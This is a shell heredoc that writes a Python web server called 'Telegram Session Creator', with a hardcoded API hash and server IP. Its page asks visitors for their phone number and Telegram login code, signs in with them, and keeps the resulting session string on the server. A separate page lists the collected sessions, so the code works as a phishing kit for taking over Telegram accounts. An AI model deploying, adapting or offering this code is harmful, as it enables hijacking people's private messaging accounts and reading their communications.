cat > /root/server.py << 'EOF'
#!/usr/bin/env python3
import asyncio
import json
import random
import string
import os
import sys
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler

# Устанавливаем зависимости если нужно
def install_deps():
    try:
        from telethon import TelegramClient
        from telethon.sessions import StringSession
    except ImportError:
        print("Installing telethon...")
        os.system("apt update && apt install -y python3-pip")
        os.system("pip3 install telethon")
        from telethon import TelegramClient
        from telethon.sessions import StringSession
    return TelegramClient, StringSession

TelegramClient, StringSession = install_deps()

# Конфиг
API_ID = 9348118
API_HASH = "b6e1802b599d8f4fb8716fcd912f20f2"
sessions_db = {}
clients_db = {}

class TelegramHandler:
    @staticmethod
    async def start_auth(phone):
        """Начинаем авторизацию"""
        phone = ''.join(c for c in phone if c.isdigit())
        if not phone.startswith('7'):
            phone = '7' + phone[-10:]
        
        session_id = ''.join(random.choices(string.digits, k=10))
        
        try:
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            await client.connect()
            
            sent_code = await client.send_code_request(phone)
            
            sessions_db[session_id] = {
                'phone': phone,
                'phone_code_hash': sent_code.phone_code_hash,
                'created': datetime.now().timestamp()
            }
            clients_db[session_id] = client
            
            print(f"[+] Auth started: {phone} -> {session_id}")
            return {'status': 'success', 'session_id': session_id}
            
        except Exception as e:
            print(f"[!] Error: {str(e)}")
            return {'status': 'error', 'message': str(e)}
    
    @staticmethod
    async def verify_code(session_id, code):
        """Проверяем код"""
        if session_id not in sessions_db:
            return {'status': 'error', 'message': 'Invalid session'}
        
        session = sessions_db[session_id]
        client = clients_db.get(session_id)
        
        if not client:
            return {'status': 'error', 'message': 'Client not found'}
        
        try:
            await client.sign_in(
                phone=session['phone'],
                code=code,
                phone_code_hash=session['phone_code_hash']
            )
            
            # Получаем сессию
            session_string = client.session.save()
            
            # Сохраняем в файл
            filename = f"/root/sessions/session_{session_id}.session"
            os.makedirs("/root/sessions", exist_ok=True)
            
            with open(filename, 'w') as f:
                f.write(session_string)
            
            # Закрываем клиент
            await client.disconnect()
            
            # Очищаем
            del sessions_db[session_id]
            del clients_db[session_id]
            
            print(f"[+] Auth success: {session['phone']}")
            return {
                'status': 'success',
                'message': 'Authenticated',
                'session_file': filename,
                'phone': session['phone']
            }
            
        except Exception as e:
            error = str(e)
            print(f"[!] Code error: {error}")
            
            # Закрываем клиент при ошибке
            try:
                await client.disconnect()
            except:
                pass
            
            # Очищаем
            if session_id in sessions_db:
                del sessions_db[session_id]
            if session_id in clients_db:
                del clients_db[session_id]
            
            return {'status': 'error', 'message': error}

class HTTPHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        """Обслуживаем HTML сайт"""
        if self.path == '/':
            # Главная страница
            self.send_response(200)
            self.send_header('Content-Type', 'text/html; charset=utf-8')
            self.end_headers()
            
            html = '''
            <!DOCTYPE html>
            <html>
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1">
                <title>Telegram Session Creator</title>
                <style>
                    * { margin: 0; padding: 0; box-sizing: border-box; }
                    body {
                        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                        min-height: 100vh;
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        padding: 20px;
                    }
                    .container {
                        background: white;
                        border-radius: 20px;
                        box-shadow: 0 20px 60px rgba(0,0,0,0.3);
                        width: 100%;
                        max-width: 400px;
                        overflow: hidden;
                    }
                    .header {
                        background: linear-gradient(135deg, #4285f4 0%, #34a853 100%);
                        color: white;
                        padding: 30px;
                        text-align: center;
                    }
                    .header h1 {
                        font-size: 24px;
                        margin-bottom: 10px;
                    }
                    .header p {
                        opacity: 0.9;
                        font-size: 14px;
                    }
                    .content {
                        padding: 30px;
                    }
                    .step {
                        display: none;
                        animation: fadeIn 0.3s;
                    }
                    .step.active {
                        display: block;
                    }
                    .input-group {
                        margin-bottom: 20px;
                    }
                    label {
                        display: block;
                        margin-bottom: 8px;
                        color: #333;
                        font-weight: 500;
                    }
                    input {
                        width: 100%;
                        padding: 15px;
                        border: 2px solid #e0e0e0;
                        border-radius: 10px;
                        font-size: 16px;
                        transition: border 0.3s;
                    }
                    input:focus {
                        outline: none;
                        border-color: #4285f4;
                    }
                    button {
                        width: 100%;
                        padding: 16px;
                        background: #4285f4;
                        color: white;
                        border: none;
                        border-radius: 10px;
                        font-size: 16px;
                        font-weight: 600;
                        cursor: pointer;
                        transition: background 0.3s;
                    }
                    button:hover {
                        background: #3367d6;
                    }
                    button:disabled {
                        background: #ccc;
                        cursor: not-allowed;
                    }
                    .alert {
                        padding: 12px;
                        border-radius: 10px;
                        margin-bottom: 20px;
                        display: none;
                    }
                    .alert.success {
                        background: #d4edda;
                        color: #155724;
                        border: 1px solid #c3e6cb;
                    }
                    .alert.error {
                        background: #f8d7da;
                        color: #721c24;
                        border: 1px solid #f5c6cb;
                    }
                    .alert.info {
                        background: #d1ecf1;
                        color: #0c5460;
                        border: 1px solid #bee5eb;
                    }
                    .loader {
                        display: none;
                        text-align: center;
                        margin: 10px 0;
                    }
                    .loader span {
                        display: inline-block;
                        width: 10px;
                        height: 10px;
                        margin: 0 2px;
                        background: #4285f4;
                        border-radius: 50%;
                        animation: bounce 1.4s infinite ease-in-out both;
                    }
                    .loader span:nth-child(1) { animation-delay: -0.32s; }
                    .loader span:nth-child(2) { animation-delay: -0.16s; }
                    @keyframes bounce {
                        0%, 80%, 100% { transform: scale(0); }
                        40% { transform: scale(1.0); }
                    }
                    @keyframes fadeIn {
                        from { opacity: 0; transform: translateY(10px); }
                        to { opacity: 1; transform: translateY(0); }
                    }
                    .session-info {
                        background: #f8f9fa;
                        padding: 15px;
                        border-radius: 10px;
                        margin-top: 20px;
                        font-family: monospace;
                        font-size: 12px;
                        word-break: break-all;
                        display: none;
                    }
                </style>
            </head>
            <body>
                <div class="container">
                    <div class="header">
                        <h1>🔐 Telegram Session</h1>
                        <p>Create session for your account</p>
                    </div>
                    
                    <div class="content">
                        <div class="alert info" id="infoAlert">
                            Enter your phone number to receive Telegram code
                        </div>
                        
                        <div class="alert success" id="successAlert"></div>
                        <div class="alert error" id="errorAlert"></div>
                        
                        <!-- Step 1: Phone -->
                        <div class="step active" id="step1">
                            <div class="input-group">
                                <label for="phone">Phone Number</label>
                                <input type="tel" id="phone" placeholder="79123456789" maxlength="15" autofocus>
                            </div>
                            <button onclick="sendPhone()">Send Code</button>
                        </div>
                        
                        <!-- Step 2: Code -->
                        <div class="step" id="step2">
                            <div class="input-group">
                                <label for="code">Telegram Code</label>
                                <input type="text" id="code" placeholder="12345" maxlength="6">
                            </div>
                            <button onclick="sendCode()">Create Session</button>
                        </div>
                        
                        <!-- Loader -->
                        <div class="loader" id="loader">
                            <span></span><span></span><span></span>
                        </div>
                        
                        <!-- Session Info -->
                        <div class="session-info" id="sessionInfo"></div>
                    </div>
                </div>
                
                <script>
                    let currentSessionId = '';
                    
                    function showStep(step) {
                        document.querySelectorAll('.step').forEach(el => {
                            el.classList.remove('active');
                        });
                        document.getElementById('step' + step).classList.add('active');
                    }
                    
                    function showAlert(type, message) {
                        const alerts = ['successAlert', 'errorAlert', 'infoAlert'];
                        alerts.forEach(id => {
                            const el = document.getElementById(id);
                            el.style.display = 'none';
                            el.textContent = '';
                        });
                        
                        const alertEl = document.getElementById(type + 'Alert');
                        if (alertEl) {
                            alertEl.style.display = 'block';
                            alertEl.textContent = message;
                        }
                    }
                    
                    function showLoader(show) {
                        document.getElementById('loader').style.display = show ? 'block' : 'none';
                    }
                    
                    async function sendPhone() {
                        const phone = document.getElementById('phone').value.trim();
                        if (!phone || phone.length < 11) {
                            showAlert('error', 'Enter valid phone number');
                            return;
                        }
                        
                        showLoader(true);
                        showAlert('info', 'Sending code to Telegram...');
                        
                        try {
                            const response = await fetch('/api/auth/start', {
                                method: 'POST',
                                headers: {'Content-Type': 'application/json'},
                                body: JSON.stringify({phone: phone})
                            });
                            
                            const data = await response.json();
                            
                            if (data.status === 'success') {
                                currentSessionId = data.session_id;
                                showStep(2);
                                showAlert('info', 'Code sent! Check Telegram.');
                                document.getElementById('code').focus();
                            } else {
                                showAlert('error', data.message || 'Error sending code');
                            }
                        } catch (error) {
                            showAlert('error', 'Network error: ' + error.message);
                        } finally {
                            showLoader(false);
                        }
                    }
                    
                    async function sendCode() {
                        const code = document.getElementById('code').value.trim();
                        if (!code || code.length < 5) {
                            showAlert('error', 'Enter code from Telegram');
                            return;
                        }
                        
                        showLoader(true);
                        showAlert('info', 'Creating session...');
                        
                        try {
                            const response = await fetch('/api/auth/code', {
                                method: 'POST',
                                headers: {'Content-Type': 'application/json'},
                                body: JSON.stringify({
                                    session_id: currentSessionId,
                                    code: code
                                })
                            });
                            
                            const data = await response.json();
                            
                            if (data.status === 'success') {
                                showAlert('success', '✅ Session created successfully!');
                                
                                // Показываем информацию о сессии
                                const sessionInfo = document.getElementById('sessionInfo');
                                sessionInfo.style.display = 'block';
                                sessionInfo.innerHTML = `
                                    <strong>Session File:</strong> ${data.session_file}<br>
                                    <strong>Phone:</strong> ${data.phone}<br>
                                    <strong>Time:</strong> ${new Date().toLocaleString()}
                                `;
                                
                                // Можно скачать файл
                                setTimeout(() => {
                                    alert('Session saved on server: ' + data.session_file);
                                }, 500);
                                
                            } else {
                                showAlert('error', data.message || 'Error creating session');
                                showStep(1); // Возвращаем на шаг 1 при ошибке
                            }
                        } catch (error) {
                            showAlert('error', 'Network error: ' + error.message);
                        } finally {
                            showLoader(false);
                        }
                    }
                    
                    // Enter key support
                    document.getElementById('phone').addEventListener('keypress', (e) => {
                        if (e.key === 'Enter') sendPhone();
                    });
                    
                    document.getElementById('code').addEventListener('keypress', (e) => {
                        if (e.key === 'Enter') sendCode();
                    });
                    
                    // Auto-format phone
                    document.getElementById('phone').addEventListener('input', (e) => {
                        let value = e.target.value.replace(/\D/g, '');
                        if (value.length > 0 && !value.startsWith('7') && !value.startsWith('8')) {
                            value = '7' + value;
                        }
                        e.target.value = value;
                    });
                </script>
            </body>
            </html>
            '''
            self.wfile.write(html.encode())
            
        elif self.path == '/sessions':
            # Страница со списком сессий
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            
            sessions_list = []
            if os.path.exists('/root/sessions'):
                for f in os.listdir('/root/sessions'):
                    if f.endswith('.session'):
                        sessions_list.append(f)
            
            html = f'''
            <html><body>
                <h1>Saved Sessions</h1>
                <p>Total: {len(sessions_list)} sessions</p>
                <ul>
                    {' '.join(f'<li>{s}</li>' for s in sessions_list)}
                </ul>
                <a href="/">Back to main</a>
            </body></html>
            '''
            self.wfile.write(html.encode())
            
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        """Обрабатываем API запросы"""
        content_length = int(self.headers['Content-Length'])
        body = self.rfile.read(content_length).decode('utf-8')
        
        try:
            data = json.loads(body)
        except:
            data = {}
        
        # Устанавливаем CORS headers
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, GET, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        
        if self.path == '/api/auth/start':
            phone = data.get('phone', '')
            
            # Запускаем асинхронную задачу
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            result = loop.run_until_complete(TelegramHandler.start_auth(phone))
            loop.close()
            
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps(result).encode())
            
        elif self.path == '/api/auth/code':
            session_id = data.get('session_id', '')
            code = data.get('code', '')
            
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            result = loop.run_until_complete(TelegramHandler.verify_code(session_id, code))
            loop.close()
            
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps(result).encode())
            
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_OPTIONS(self):
        """CORS preflight"""
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, GET, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()
    
    def log_message(self, format, *args):
        # Тихий режим
        pass

def run_server():
    """Запускаем сервер"""
    print("=" * 60)
    print("TELEGRAM SESSION CREATOR")
    print("=" * 60)
    print("Server starting...")
    print("Web interface: http://188.225.11.61:5000")
    print("API endpoints:")
    print("  POST /api/auth/start - Start auth with phone")
    print("  POST /api/auth/code  - Verify code and create session")
    print("  GET  /              - Web interface")
    print("  GET  /sessions      - List sessions")
    print("=" * 60)
    
    # Создаем папку для сессий
    os.makedirs("/root/sessions", exist_ok=True)
    
    # Запускаем сервер
    server = HTTPServer(('0.0.0.0', 5000), HTTPHandler)
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\nServer stopped")
        server.server_close()

if __name__ == '__main__':
    run_server()
EOF

# Даем права
chmod +x /root/server.py

# Создаем папку для сессий
mkdir -p /root/sessions
